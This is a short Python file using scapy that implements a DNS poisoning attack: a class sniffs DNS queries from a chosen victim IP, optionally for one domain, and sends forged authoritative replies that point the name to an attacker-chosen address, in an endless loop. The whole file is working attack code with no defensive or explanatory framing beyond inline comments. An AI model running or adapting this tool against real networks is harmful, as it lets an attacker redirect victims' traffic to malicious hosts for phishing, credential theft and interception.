import sys
from scapy.all import *

class DnsPoisoning:

    def __init__(self):
        pass

    def doPoison(self, ipVictim, url, ipPoison, interface):

        def verifyPacket(pkt, ipVictim, url):
            # check if the packet (is a DNS packet) AND (comes from the target)
            if pkt.haslayer(DNS) and ((ipVictim is None) or (pkt[IP].src == ipVictim)):
                # check if the dns packet (is a request) AND (concerns the target URL)
                if (pkt[DNS].qr == 0) and ((url is None) or (pkt[DNS].qd.qname.decode('UTF-8') == url)):
                    return True
            return False

        def makeFakeResponse(pkt, ipPoison, interface):
            # for a response revert destination and source
            fakeIP = IP(src=pkt[IP].dst, dst=pkt[IP].src)
            fakeUDP = UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
            # fake query pointing the requested URL to the poison IP
            fakeDNSRR = DNSRR(rrname=pkt[DNS].qd.qname, rdata=ipPoison)
            # fake DNS response
            fakeDNS = DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=fakeDNSRR)
            # combine into complete packet
            poisonPacket = fakeIP/fakeUDP/fakeDNS
            # send the poison packet to the victim
            send(poisonPacket, verbose=0, iface=interface)
            print("Fake packet sent")

        while True:
            sniff(count=1,  # capture 1 packet
                  store=0,  # do not store it
                  lfilter=lambda pkt: verifyPacket(pkt, ipVictim, url),
                  prn=lambda pkt: makeFakeResponse(pkt, ipPoison, interface),
                  iface=interface)

        print("You are poisoned")